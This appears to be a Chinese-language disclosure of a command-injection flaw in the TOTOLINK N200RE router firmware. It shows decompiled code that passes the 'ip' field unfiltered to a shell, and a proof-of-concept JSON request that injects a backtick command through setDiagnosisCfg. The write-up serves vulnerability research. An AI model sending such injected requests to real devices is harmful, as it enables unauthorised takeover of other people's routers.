# TOTOLINK路由器N200RE存在命令执行漏洞

## 资产证明

截图如下：

![image-20250329134941430](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291349590.png)

# 固件获取与证明型号

在官网下载该N200RE V5_Firmware V9.3.5u.6095_B20200916版本的固件

https://www.totolink.net/data/upload/20200924/6bb0fad48ff63e85b773fab4b88a19e2.zip



# 命令执行漏洞



![image-20250329135259165](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291352269.png)



![image-20250329135305627](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291353656.png)

看以看到这里是两个函数分开了但都属于通个部分

![image-20250329135317177](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291353211.png)

int __fastcall sub_421DDC(int a1)

{

 const char *Var; // $s2

 int v3; // $v0

 int v4; // $v0

 char v6[128]; // [sp+18h] [-80h] BYREF

 

 memset(v6, 0, sizeof(v6));

 Var = (const char *)websGetVar(a1, "ip", "www.baidu.com");

 v3 = websGetVar(a1, "num", &byte_43A4B0);

 v4 = atoi(v3);

 sprintf(v6, "ping %s -w %d &>/var/log/pingCheck", Var, v4);

 doSystem(v6);

 setResponse(&word_438564, "reserv");

 return 1;

}

dosystem的时候直接对拼接的v6进行执行没有任何过滤直接用反引号闭合就可以任意命令执行了。

 

 

测试如下：

输入127.0.0.1  1条数抓包，点击发包

![image-20250329135333239](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291353303.png)

这里将payload进行修改，修改恶意命令为可以任意写入文件到服务器：

{"ip":"`ls>/www/zhecho.txt`","num":"1","topicurl":"setDiagnosisCfg"}

![image-20250329135351111](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291353145.png)

发包成功，接着到固件系统查ls命令查看，发现成功创建该zhecho.txt文件：

![image-20250329135402209](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291354300.png)

![image-20250329135408954](https://cdn.jsdelivr.net/gh/zhech0/Pictures/202503291354013.png)